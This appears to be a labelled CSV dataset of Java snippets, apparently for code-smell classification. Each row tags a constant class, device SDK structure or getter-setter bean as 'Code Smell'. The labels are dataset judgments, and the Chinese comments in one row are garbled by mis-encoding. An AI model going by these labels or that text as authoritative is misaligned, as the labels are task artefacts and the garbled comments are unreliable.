text,label,text_label
"public class ViewType {
  public static final int RECT=0;
  public static final int OVAL=1;
  public static final int LIST=2;
}
public class ViewType {
  public static final int RECT=0;
  public static final int OVAL=1;
  public static final int LIST=2;
  public static final int GRID=3;
  public static final int HORI=0;
  public static final int VERT=1;
  public static final int DARK=0;
  public static final int LIGHT=1;
}",1,Code Smell
"public static class CAPTURE_SIZE extends SdkStructure {
  public static final int CAPTURE_SIZE_D1=0;
  public static final int CAPTURE_SIZE_HD1=1;
  public static final int CAPTURE_SIZE_BCIF=2;
  public static final int CAPTURE_SIZE_CIF=3;
  public static final int CAPTURE_SIZE_QCIF=4;
  public static final int CAPTURE_SIZE_VGA=5;
  public static final int CAPTURE_SIZE_QVGA=6;
  public static final int CAPTURE_SIZE_SVCD=7;
  public static final int CAPTURE_SIZE_QQVGA=8;
  public static final int CAPTURE_SIZE_SVGA=9;
  public static final int CAPTURE_SIZE_XVGA=10;
  public static final int CAPTURE_SIZE_WXGA=11;
  public static final int CAPTURE_SIZE_SXGA=12;
  public static final int CAPTURE_SIZE_WSXGA=13;
  public static final int CAPTURE_SIZE_UXGA=14;
  public static final int CAPTURE_SIZE_WUXGA=15;
  public static final int CAPTURE_SIZE_LTF=16;
  public static final int CAPTURE_SIZE_720=17;
  public static final int CAPTURE_SIZE_1080=18;
  public static final int CAPTURE_SIZE_1_3M=19;
  public static final int CAPTURE_SIZE_2M=20;
  public static final int CAPTURE_SIZE_5M=21;
  public static final int CAPTURE_SIZE_3M=22;
  public static final int CAPTURE_SIZE_5_0M=23;
  public static final int CPTRUTE_SIZE_1_2M=24;
  public static final int CPTRUTE_SIZE_1408_1024=25;
  public static final int CPTRUTE_SIZE_8M=26;
  public static final int CPTRUTE_SIZE_2560_1920=27;
  public static final int CAPTURE_SIZE_960H=28;
  public static final int CAPTURE_SIZE_960_720=29;
  public static final int CAPTURE_SIZE_NHD=30;
  public static final int CAPTURE_SIZE_QNHD=31;
  public static final int CAPTURE_SIZE_QQNHD=32;
  public static final int CAPTURE_SIZE_960_540=33;
  public static final int CAPTURE_SIZE_640_352=34;
  public static final int CAPTURE_SIZE_640_400=35;
  public static final int CAPTURE_SIZE_320_192=36;
  public static final int CAPTURE_SIZE_320_176=37;
  public static final int CAPTURE_SIZE_SVGA1=38;
  public static final int CAPTURE_SIZE_NR=255;
}",1,Code Smell
"/** 
 * Entity mapped to table ""DOWNLOAD_LABELS"".
 */
@Entity(nameInDb=""DOWNLOAD_LABELS"") public class DownloadLabel {
  @Id private Long id;
  private String label;
  private long time;
  @Generated public DownloadLabel(){
  }
  public DownloadLabel(  Long id){
    this.id=id;
  }
  @Generated public DownloadLabel(  Long id,  String label,  long time){
    this.id=id;
    this.label=label;
    this.time=time;
  }
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getLabel(){
    return label;
  }
  public void setLabel(  String label){
    this.label=label;
  }
  public long getTime(){
    return time;
  }
  public void setTime(  long time){
    this.time=time;
  }
}
",1,Code Smell
"public static class NET_DELIVERY_FILE_INFO extends SdkStructure {
  public int emFileType;
  public byte[] szFileURL=new byte[DELIVERY_FILE_URL_LEN];
  public int nImageSustain;
  public int emPlayWithMode;
  public byte[] byReserved=new byte[1020];
}",1,Code Smell
"/** 
 * Descriptor for data being loaded or selected by a media source. 
 */
final class MediaLoadData {
  /** 
 * One of the  {@link C} {@code DATA_TYPE_*} constants defining the type of data. 
 */
  public final int dataType;
  /** 
 * One of the  {@link C} {@code TRACK_TYPE_*} constants if the data corresponds to media of aspecific type.  {@link C#TRACK_TYPE_UNKNOWN} otherwise.
 */
  public final int trackType;
  /** 
 * The format of the track to which the data belongs. Null if the data does not belong to a specific track.
 */
  public final @Nullable Format trackFormat;
  /** 
 * One of the  {@link C} {@code SELECTION_REASON_*} constants if the data belongs to a track.{@link C#SELECTION_REASON_UNKNOWN} otherwise.
 */
  public final int trackSelectionReason;
  /** 
 * Optional data associated with the selection of the track to which the data belongs. Null if the data does not belong to a track.
 */
  public final @Nullable Object trackSelectionData;
  /** 
 * The start time of the media, or  {@link C#TIME_UNSET} if the data does not belong to aspecific media period.
 */
  public final long mediaStartTimeMs;
  /** 
 * The end time of the media, or  {@link C#TIME_UNSET} if the data does not belong to a specificmedia period or the end time is unknown.
 */
  public final long mediaEndTimeMs;
  /** 
 * Creates media load data.
 * @param dataType One of the {@link C} {@code DATA_TYPE_*} constants defining the type of data.
 * @param trackType One of the {@link C} {@code TRACK_TYPE_*} constants if the data correspondsto media of a specific type.  {@link C#TRACK_TYPE_UNKNOWN} otherwise.
 * @param trackFormat The format of the track to which the data belongs. Null if the data doesnot belong to a track.
 * @param trackSelectionReason One of the {@link C} {@code SELECTION_REASON_*} constants if thedata belongs to a track.  {@link C#SELECTION_REASON_UNKNOWN} otherwise.
 * @param trackSelectionData Optional data associated with the selection of the track to whichthe data belongs. Null if the data does not belong to a track.
 * @param mediaStartTimeMs The start time of the media, or {@link C#TIME_UNSET} if the data doesnot belong to a specific media period.
 * @param mediaEndTimeMs The end time of the media, or {@link C#TIME_UNSET} if the data does notbelong to a specific media period or the end time is unknown.
 */
  public MediaLoadData(  int dataType,  int trackType,  @Nullable Format trackFormat,  int trackSelectionReason,  @Nullable Object trackSelectionData,  long mediaStartTimeMs,  long mediaEndTimeMs){
    this.dataType=dataType;
    this.trackType=trackType;
    this.trackFormat=trackFormat;
    this.trackSelectionReason=trackSelectionReason;
    this.trackSelectionData=trackSelectionData;
    this.mediaStartTimeMs=mediaStartTimeMs;
    this.mediaEndTimeMs=mediaEndTimeMs;
  }
}
",1,Code Smell
"public static class NET_DVR_FILECOND_V40 extends Structure {
  public int lChannel;
  public int dwFileType;
  public int dwIsLocked;
  public int dwUseCardNo;
  public byte[] sCardNumber=new byte[CARDNUM_LEN_OUT];
  public NET_DVR_TIME struStartTime=new NET_DVR_TIME();
  public NET_DVR_TIME struStopTime=new NET_DVR_TIME();
  public byte byDrawFrame;
  public byte byFindType;
  public byte byQuickSearch;
  public byte bySpecialFindInfoType;
  public int dwVolumeNum;
  public byte[] byWorkingDeviceGUID=new byte[GUID_LEN];
  public NET_DVR_SPECIAL_FINDINFO_UNION uSpecialFindInfo=new NET_DVR_SPECIAL_FINDINFO_UNION();
  public byte byStreamType;
  public byte byAudioFile;
  public byte[] byRes2=new byte[30];
}",1,Code Smell
"public static class Bean {
  private int id;
  public Item item;
  public int getId(){
    return id;
  }
  public void setId(  int id){
    this.id=id;
  }
}
public static class Bean {
  private long id;
  public Item item;
  public float value;
  public long getId(){
    return id;
  }
  public void setId(  long id){
    this.id=id;
  }
  public float getValue(){
    return value;
  }
  public void setValue(  float value){
    this.value=value;
  }
}
static class Bean {
  int f0;
  int f1;
  int[] f2;
  int f3;
  public Bean(  int f0,  int f1,  int[] f2,  int f3){
    this.f0=f0;
    this.f1=f1;
    this.f2=f2;
    this.f3=f3;
  }
  public int getF0(){
    return f0;
  }
  public int getF1(){
    return f1;
  }
  public int[] getF2(){
    return f2;
  }
  public int getF3(){
    return f3;
  }
}
public static class Bean {
  public String k1;
  public String k2;
  public String k3;
}",1,Code Smell
"public class Role implements Serializable {
  private String id;
  private String name;
  private String description;
  private String type;
  private Long createTime;
  private Long updateTime;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getDescription(){
    return description;
  }
  public void setDescription(  String description){
    this.description=description;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
  public Long getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  Long updateTime){
    this.updateTime=updateTime;
  }
}",1,Code Smell
"/** 
 * <p> </p>
 * @author fit2cloud
 * @since 2023-09-22
 */
@TableName(""visualization_linkage_field"") public class VisualizationLinkageField implements Serializable {
  private static final long serialVersionUID=1L;
  private Long id;
  /** 
 * 鑱斿姩ID
 */
  private Long linkageId;
  /** 
 * 婧愬浘琛ㄥ瓧娈
 */
  private Long sourceField;
  /** 
 * 鐩爣鍥捐〃瀛楁
 */
  private Long targetField;
  /** 
 * 鏇存柊鏃堕棿
 */
  private Long updateTime;
  private Long copyFrom;
  private Long copyId;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public Long getLinkageId(){
    return linkageId;
  }
  public void setLinkageId(  Long linkageId){
    this.linkageId=linkageId;
  }
  public Long getSourceField(){
    return sourceField;
  }
  public void setSourceField(  Long sourceField){
    this.sourceField=sourceField;
  }
  public Long getTargetField(){
    return targetField;
  }
  public void setTargetField(  Long targetField){
    this.targetField=targetField;
  }
  public Long getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  Long updateTime){
    this.updateTime=updateTime;
  }
  public Long getCopyFrom(){
    return copyFrom;
  }
  public void setCopyFrom(  Long copyFrom){
    this.copyFrom=copyFrom;
  }
  public Long getCopyId(){
    return copyId;
  }
  public void setCopyId(  Long copyId){
    this.copyId=copyId;
  }
  @Override public String toString(){
    return ""VisualizationLinkageField{"" + ""id = "" + id + "", linkageId = ""+ linkageId+ "", sourceField = ""+ sourceField+ "", targetField = ""+ targetField+ "", updateTime = ""+ updateTime+ "", copyFrom = ""+ copyFrom+ "", copyId = ""+ copyId+ ""}"";
  }
}",1,Code Smell
"public static class VERSION_CODES {
  public static final int BASE=1;
  public static final int BASE_1_1=2;
  public static final int CUPCAKE=3;
  public static final int CUR_DEVELOPMENT=10000;
  public static final int DONUT=4;
  public static final int ECLAIR=5;
  public static final int ECLAIR_0_1=6;
  public static final int ECLAIR_MR1=7;
  public static final int FROYO=8;
  public static final int GINGERBREAD=9;
  public static final int GINGERBREAD_MR1=10;
  public static final int HONEYCOMB=11;
  public static final int HONEYCOMB_MR1=12;
  public static final int HONEYCOMB_MR2=13;
  public static final int ICE_CREAM_SANDWICH=14;
  public static final int ICE_CREAM_SANDWICH_MR1=15;
  public static final int JELLY_BEAN=16;
  public static final int JELLY_BEAN_MR1=17;
  public static final int JELLY_BEAN_MR2=18;
  public static final int KITKAT=19;
  public static final int KITKAT_WATCH=20;
  public static final int LOLLIPOP=21;
  public static final int LOLLIPOP_MR1=22;
  public static final int M=23;
  public static final int N=24;
  public static final int O=25;
}",1,Code Smell
"public class MySQLSelect extends SelectBase<MySQLExpression> implements MySQLExpression {
  private SelectType fromOptions=SelectType.ALL;
  private List<String> modifiers=Collections.emptyList();
  private MySQLText hint;
  public enum SelectType {  DISTINCT,   ALL,   DISTINCTROW}
  public void setSelectType(  SelectType fromOptions){
    this.setFromOptions(fromOptions);
  }
  public SelectType getFromOptions(){
    return fromOptions;
  }
  public void setFromOptions(  SelectType fromOptions){
    this.fromOptions=fromOptions;
  }
  public void setModifiers(  List<String> modifiers){
    this.modifiers=modifiers;
  }
  public List<String> getModifiers(){
    return modifiers;
  }
  @Override public MySQLConstant getExpectedValue(){
    return null;
  }
  public void setHint(  MySQLText hint){
    this.hint=hint;
  }
  public MySQLText getHint(){
    return hint;
  }
}
",1,Code Smell
"public static class ALARM_ACCESS_CTL_BREAK_IN_INFO extends SdkStructure {
  public int dwSize;
  public int nDoor;
  public byte[] szDoorName=new byte[NET_MAX_DOORNAME_LEN];
  public NET_TIME stuTime;
  public int nEventID;
  public int emMethod;
  public boolean bRealUTC;
  public NET_TIME_EX RealUTC;
  public byte[] reserved=new byte[4];
  public ALARM_ACCESS_CTL_BREAK_IN_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public static class OriginSock {
  private String identifier;
  private String local_ip;
  private int local_port;
  private String peer_ip;
  private int peer_port;
  public String getIdentifier(){
    return identifier;
  }
  public void setIdentifier(  String identifier){
    this.identifier=identifier;
  }
  public String getLocal_ip(){
    return local_ip;
  }
  public void setLocal_ip(  String local_ip){
    this.local_ip=local_ip;
  }
  public int getLocal_port(){
    return local_port;
  }
  public void setLocal_port(  int local_port){
    this.local_port=local_port;
  }
  public String getPeer_ip(){
    return peer_ip;
  }
  public void setPeer_ip(  String peer_ip){
    this.peer_ip=peer_ip;
  }
  public int getPeer_port(){
    return peer_port;
  }
  public void setPeer_port(  int peer_port){
    this.peer_port=peer_port;
  }
}
",1,Code Smell
"public class NewTernaryNode<T> implements Node<T> {
  protected final Node<T> left;
  protected final Node<T> middle;
  protected final Node<T> right;
  private final String leftStr;
  private final String rightStr;
  public NewTernaryNode(  Node<T> left,  Node<T> middle,  Node<T> right,  String leftStr,  String rightStr){
    this.left=left;
    this.middle=middle;
    this.right=right;
    this.leftStr=leftStr;
    this.rightStr=rightStr;
  }
  public Node<T> getLeft(){
    return left;
  }
  public Node<T> getMiddle(){
    return middle;
  }
  public Node<T> getRight(){
    return right;
  }
  public String getLeftStr(){
    return leftStr;
  }
  public String getRightStr(){
    return rightStr;
  }
}
",1,Code Smell
"/** 
 * Serves as the context of an analysis process. This context contains the following constructs
 */
protected static class AnalysisContext {
  private final String fieldName;
  private final FieldType fieldType;
  private final Analyzer analyzer;
  private final Set<BytesRef> termsToMatch;
  /** 
 * Constructs a new AnalysisContext with a given field tpe, analyzer and termsToMatch. By default the field name in this context will be  {@code null}. During the analysis processs, The produced tokens will be compaired to the terms in the  {@code termsToMatch} set. Whenfound, these tokens will be marked as a match.
 * @param fieldType The type of the field the analysis is performed on.
 * @param analyzer The analyzer to be used.
 * @param termsToMatch Holds all the terms that should match during the analysis process.
 */
  public AnalysisContext(  FieldType fieldType,  Analyzer analyzer,  Set<BytesRef> termsToMatch){
    this(null,fieldType,analyzer,termsToMatch);
  }
  /** 
 * Constructs an AnalysisContext with a given field name, field type and analyzer. By default this context will hold no terms to match
 * @param fieldName The name of the field the analysis is performed on (may be {@code null}).
 * @param fieldType The type of the field the analysis is performed on.
 * @param analyzer The analyzer to be used during the analysis process.
 */
  public AnalysisContext(  String fieldName,  FieldType fieldType,  Analyzer analyzer){
    this(fieldName,fieldType,analyzer,EMPTY_BYTES_SET);
  }
  /** 
 * Constructs a new AnalysisContext with a given field tpe, analyzer and termsToMatch. During the analysis processs, The produced tokens will be compared to the terms in the  {@code termsToMatch} set. When found, these tokens will be marked as a match.
 * @param fieldName The name of the field the analysis is performed on (may be {@code null}).
 * @param fieldType The type of the field the analysis is performed on.
 * @param analyzer The analyzer to be used.
 * @param termsToMatch Holds all the terms that should match during the analysis process.
 */
  public AnalysisContext(  String fieldName,  FieldType fieldType,  Analyzer analyzer,  Set<BytesRef> termsToMatch){
    this.fieldName=fieldName;
    this.fieldType=fieldType;
    this.analyzer=analyzer;
    this.termsToMatch=termsToMatch;
  }
  public String getFieldName(){
    return fieldName;
  }
  public FieldType getFieldType(){
    return fieldType;
  }
  public Analyzer getAnalyzer(){
    return analyzer;
  }
  public Set<BytesRef> getTermsToMatch(){
    return termsToMatch;
  }
}
",1,Code Smell
"/** 
 * @author Craig Walls
 * @author Christian Tzolov
 */
public class TextReader implements DocumentReader {
  public static final String CHARSET_METADATA=""charset"";
  public static final String SOURCE_METADATA=""source"";
  /** 
 * Input resource to load the text from.
 */
  private final Resource resource;
  /** 
 * @return Character set to be used when loading data from the
 */
  private Charset charset=StandardCharsets.UTF_8;
  private Map<String,Object> customMetadata=new HashMap<>();
  public TextReader(  String resourceUrl){
    this(new DefaultResourceLoader().getResource(resourceUrl));
  }
  public TextReader(  Resource resource){
    Objects.requireNonNull(resource,""The Spring Resource must not be null"");
    this.resource=resource;
  }
  public void setCharset(  Charset charset){
    Objects.requireNonNull(charset,""The charset must not be null"");
    this.charset=charset;
  }
  public Charset getCharset(){
    return this.charset;
  }
  /** 
 * Metadata associated with all documents created by the loader.
 * @return Metadata to be assigned to the output Documents.
 */
  public Map<String,Object> getCustomMetadata(){
    return this.customMetadata;
  }
  @Override public List<Document> get(){
    try {
      String document=StreamUtils.copyToString(this.resource.getInputStream(),this.charset);
      this.customMetadata.put(CHARSET_METADATA,this.charset.name());
      this.customMetadata.put(SOURCE_METADATA,this.resource.getFilename());
      return List.of(new Document(document,this.customMetadata));
    }
 catch (    IOException e) {
      throw new RuntimeException(e);
    }
  }
}",1,Code Smell
"/** 
 * @author Geng Rong
 */
class MiniMaxParentProperties {
  private String apiKey;
  private String baseUrl;
  public String getApiKey(){
    return apiKey;
  }
  public void setApiKey(  String apiKey){
    this.apiKey=apiKey;
  }
  public String getBaseUrl(){
    return baseUrl;
  }
  public void setBaseUrl(  String baseUrl){
    this.baseUrl=baseUrl;
  }
}
",1,Code Smell
"public class CloudProjectLogWithBLOBs extends CloudProjectLog implements Serializable {
  /** 
 * This field was generated by MyBatis Generator. This field corresponds to the database column cloud_project_log.operation
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  private String operation;
  /** 
 * This field was generated by MyBatis Generator. This field corresponds to the database column cloud_project_log.output
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  private String output;
  /** 
 * This field was generated by MyBatis Generator. This field corresponds to the database table cloud_project_log
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  private static final long serialVersionUID=1L;
  /** 
 * This method was generated by MyBatis Generator. This method returns the value of the database column cloud_project_log.operation
 * @return the value of cloud_project_log.operation
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  public String getOperation(){
    return operation;
  }
  /** 
 * This method was generated by MyBatis Generator. This method sets the value of the database column cloud_project_log.operation
 * @param operation the value for cloud_project_log.operation
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  public void setOperation(  String operation){
    this.operation=operation == null ? null : operation.trim();
  }
  /** 
 * This method was generated by MyBatis Generator. This method returns the value of the database column cloud_project_log.output
 * @return the value of cloud_project_log.output
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  public String getOutput(){
    return output;
  }
  /** 
 * This method was generated by MyBatis Generator. This method sets the value of the database column cloud_project_log.output
 * @param output the value for cloud_project_log.output
 * @mbg.generated Fri Aug 11 15:18:52 CST 2023
 */
  public void setOutput(  String output){
    this.output=output == null ? null : output.trim();
  }
}",1,Code Smell
"/** 
 * Created by wenshao on 16/03/2017.
 */
public class BaseDTO implements Serializable {
  /** 
 * serialVersionUID
 */
  private static final long serialVersionUID=-1;
  /** 
 * version
 */
  private String version;
  /** 
 * is online test
 */
  private Boolean onlineTest=Boolean.FALSE;
  /** 
 * http referer
 */
  private String referer;
  public String getVersion(){
    return version;
  }
  public void setVersion(  String version){
    this.version=version;
  }
  public Boolean isOnlineTest(){
    return onlineTest;
  }
  public void setOnlineTest(  Boolean onlineTest){
    this.onlineTest=onlineTest;
  }
  public String getReferer(){
    return referer;
  }
  public void setReferer(  String referer){
    this.referer=referer;
  }
  @Override public String toString(){
    return ""BaseDTO [version="" + version + "", onlineTest=""+ onlineTest+ "", referer=""+ referer+ ""]"";
  }
}",1,Code Smell
"public static class NET_DVR_CHECK_FACE_PICTURE_CFG extends Structure {
  public int dwSize;
  public int dwPictureNo;
  public int dwPictureLen;
  public Pointer pPictureBuffer;
  public int dwFaceTemplateLen;
  public Pointer pFaceTemplateBuffer;
  public byte[] byRes=new byte[248];
}",1,Code Smell
